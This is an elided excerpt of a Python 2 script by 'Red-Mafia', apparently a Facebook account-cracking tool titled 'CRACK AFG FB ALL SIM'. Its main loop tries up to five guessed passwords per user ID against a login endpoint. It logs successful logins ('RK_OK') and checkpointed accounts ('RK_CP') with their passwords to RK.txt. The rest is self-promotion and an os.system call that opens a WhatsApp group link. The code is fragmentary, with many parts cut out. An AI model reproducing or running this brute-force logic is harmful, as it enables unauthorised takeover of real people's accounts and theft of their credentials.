...
Mking_youtube = random.choice(["https://youtube.com/channel/UCPOWtzNan9ff-E0RI66Wu2A"])

youtuber = Mking_youtube

def youtube():
	Style_profaisor("  please subscribe My FB PAGE author :) Thank you")
...
def telegram():
	Style_profaisor("  please Join To watsapp Group :) Thank you")
	os.system("xdg-open https://chat.whatsapp.com/KTWCrqO6IC62Ob9MystPng")
...
╚═╝  ╚═╝    ╚═╝  ╚═╝
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Red-Mafia(RK) 
\033[1;91m GitHub      : https://github.com/Red-Mafia
\033[1;91m YouTube     : Red-Mafia
\033[1;91m WATSAPP   : +923188214452
\033[1;91m FACEBOOK    : https://www.facebook.com/ᎡᎬᎠ-ᎷᎪҒᏆᎪ-102896575436747/
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY RED-MAFIA'
        print '\x1b[1;92m THISE SCRIPT CREATED BY RED-MAFIA '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[RK_OK] ' + k + c + user + ' | ' + pass1
                okb = open('RK.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[RK_CP] ' + k + c + user + ' | ' + pass1
                cps = open('RK.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[RK_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('RK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[RK_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('RK.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[RK_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('RK.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[RK_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('RK.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[RK_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('RK.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[RK_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('RK.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[RK_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('RK.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[RK_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('RK.txt', 'a')
